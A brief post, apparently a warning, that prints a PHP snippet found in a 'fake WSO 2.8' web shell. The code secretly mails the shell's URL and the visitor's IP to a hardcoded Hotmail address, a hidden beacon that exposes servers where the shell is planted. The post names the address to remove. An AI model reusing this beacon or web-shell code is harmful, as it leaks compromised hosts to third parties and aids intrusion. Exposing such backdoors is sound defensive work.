In FAKE WSO 2.8
<pre>
$visitc = $_COOKIE["visits"];
if ($visitc == "") {
  $visitc  = 0;
  $visitor = $_SERVER["REMOTE_ADDR"];
  $web     = $_SERVER["HTTP_HOST"];
  $inj     = $_SERVER["REQUEST_URI"];
  $target  = rawurldecode($web.$inj);
  $judul   = "WebShell http://$target by $visitor";
  $body    = "Bug: $target by $visitor<br>";
  if (!empty($web)) { @mail("f3d0s3rv3r@hotmail.com",$judul,$body); }
}
else { $visitc++; }
@setcookie("visitz",$visitc);



Kill f3d0s3rv3r@hotmail.com
Source> https://code.google.com/u/104375330723671482720/
